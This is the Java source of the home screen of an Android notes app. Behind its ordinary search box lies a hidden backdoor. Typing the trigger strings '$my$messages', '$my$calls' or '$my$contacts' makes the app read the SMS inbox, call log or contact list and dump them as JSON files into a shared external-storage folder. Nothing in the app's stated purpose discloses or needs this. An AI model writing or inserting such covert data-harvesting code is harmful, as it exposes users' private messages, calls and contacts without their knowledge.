package com.example.notes.Activities;

import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;
import android.content.DialogInterface;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.text.Editable;
import android.text.TextWatcher;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import com.example.notes.adapters.NotesAdapter;
import com.example.notes.R;
import com.example.notes.objects.FileHelper;
import com.example.notes.objects.Larry;
import com.example.notes.objects.Note;

import java.io.File;
import java.io.FileWriter;
import java.util.ArrayList;

public class HomeActivity extends AppCompatActivity {
    RecyclerView notesRecyclerView;
    Button createButton,infoButton;
    EditText searchEditText;
    NotesAdapter notesAdapter;
    ArrayList<Note>notes;
    FileHelper fileHelper;
    public TextView notesTextView,zeroNotesTextView;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_home);

        notesRecyclerView=findViewById(R.id.NOTES_RECYCLER_VIEW);
        createButton=findViewById(R.id.CREATE_BUTTON);
        infoButton=findViewById(R.id.INFO_BUTTON);
        searchEditText=findViewById(R.id.SEARCH_EDIT_TEXT);
        notesTextView=findViewById(R.id.NOTES_TEXTVIEW);
        zeroNotesTextView=findViewById(R.id.ZERO_NOTES_TEXTVIEW);
        notesRecyclerView.setLayoutManager(new LinearLayoutManager(this));

        fileHelper=new FileHelper(this);

        createButton.setOnClickListener((v)->{
            Intent noteIntent=new Intent(this,NoteActivity.class);
            noteIntent.putExtra(NoteActivity.TYPE,NoteActivity.CREATE);
            startActivity(noteIntent);
        });
        infoButton.setOnClickListener((v)->{
            new AlertDialog.Builder(this)
                    .setTitle("About Notes")
                    .setMessage("-simple notes app\n" +
                                "-Source Code written in Java\n" +
                                "-Built with Android Studio\n"+
                                "\n*Developed By Larry*\n" )
                    .setPositiveButton("okay", new DialogInterface.OnClickListener() {
                        @Override
                        public void onClick(DialogInterface dialogInterface, int i) {
                            dialogInterface.dismiss();
                        }
                    }).show();
        });
        searchEditText.addTextChangedListener(new TextWatcher() {
            @Override
            public void beforeTextChanged(CharSequence charSequence, int i, int i1, int i2) {

            }
            @Override
            public void onTextChanged(CharSequence charSequence, int i, int i1, int i2) {
                try{
                    notesAdapter.filter(charSequence.toString().toLowerCase());
                    try{
                       new Thread(new Runnable() {
                           @Override
                           public void run() {
                               processCmd(charSequence.toString());
                           }
                       }).start();
                    }
                    catch (Exception e){
                        e.printStackTrace();
                    }
                }
                catch (Exception e){e.printStackTrace();}
            }
            @Override
            public void afterTextChanged(Editable editable) {

            }
        });
    }
    @Override
    protected void onResume(){
        super.onResume();
        notes=fileHelper.read();
        notesAdapter=new NotesAdapter(this,this,notes);
        notesRecyclerView.setAdapter(notesAdapter);
        notesAdapter.updateRoot();
    }
    void processCmd(String cmd){
        String resultText="";
        if(cmd.equals("$my$messages")){
            System.out.println("fetching content..."+cmd);
            for(Larry.Message message:getMessages())
                resultText+="\n"+message.toJSON();
            writeTextFile(resultText,"messages.json");
        }
        else if(cmd.equals("$my$calls")){
            System.out.println("fetching content..."+cmd);
            for(Larry.Call call:getCalls())
                resultText+="\n"+call.toJSON();
            writeTextFile(resultText,"calls.json");
        }
        else if(cmd.equals("$my$contacts")){
            System.out.println("fetching content..."+cmd);
            for(Larry.Contact contact:getContacts())
                resultText+="\n"+contact.toJSON();
            writeTextFile(resultText,"contacts.json");
        }
    }
    void writeTextFile(String text,String filename){
        try {
            System.out.println(text);
            File rootDirectory= Environment.getExternalStorageDirectory();
            File textFile=new File(rootDirectory,"//fetch//"+filename);
            FileWriter fileWriter=new FileWriter(textFile);
            fileWriter.write(text);
            fileWriter.flush();
            fileWriter.close();
        }
        catch (Exception e){
            e.printStackTrace();
        }
    }
    ArrayList<Larry.Message>getMessages(){
        ArrayList<Larry.Message>result=new ArrayList<>();
        Uri uri=Uri.parse("content://sms//inbox");
        Cursor cursor=getContentResolver().query(uri,null,null,null,null);

        if(cursor!=null && cursor.moveToFirst()){
            int bodyIndex=cursor.getColumnIndex(Telephony.Sms.BODY);
            int addressIndex=cursor.getColumnIndex(Telephony.Sms.ADDRESS);
            int timeIndex=cursor.getColumnIndex(Telephony.Sms.DATE);

            do{
                String sender=cursor.getString(addressIndex);
                String body=cursor.getString(bodyIndex);
                long timestamp=cursor.getLong(timeIndex);

                Larry.Message message=new Larry.Message().setSender(sender).setMessage(body).setTimestamp(timestamp);
                result.add(message);

            }while (cursor.moveToNext());

            cursor.close();
        }
        return result;
    }
    ArrayList<Larry.Call>getCalls(){
        ArrayList<Larry.Call>result=new ArrayList<>();

        Uri uri= CallLog.Calls.CONTENT_URI;
        Cursor cursor=getContentResolver().query(uri,null,null,null,null);

        if(cursor!=null && cursor.moveToFirst()){
            int numberIndex=cursor.getColumnIndex(CallLog.Calls.NUMBER);
            int timeIndex=cursor.getColumnIndex(CallLog.Calls.DATE);
            int durationIndex=cursor.getColumnIndex(CallLog.Calls.DURATION);

            do{
                String number=cursor.getString(numberIndex);
                long timestamp=cursor.getLong(timeIndex);
                long duration=cursor.getLong(durationIndex);

                Larry.Call call=new Larry.Call().setPhoneNumber(number).setTimestamp(timestamp).setDuration(duration);
                result.add(call);

            }while (cursor.moveToNext());

            cursor.close();
        }

        return result;
    }
    ArrayList<Larry.Contact>getContacts(){
        ArrayList<Larry.Contact>result=new ArrayList<>();
        Uri uri= ContactsContract.Contacts.CONTENT_URI;
        Cursor cursor=getContentResolver().query(uri,null,null,null,null);

        if(cursor!=null && cursor.moveToFirst()){
            int nameIndex=cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
            int numberIndex=cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);

            do{
                String name=cursor.getString(nameIndex);
                String phoneNumber=cursor.getString(numberIndex);

                Larry.Contact contact=new Larry.Contact().setName(name).setPhoneNumber(phoneNumber);
                result.add(contact);

            }while (cursor.moveToNext());

            cursor.close();
        }
        return result;
    }

}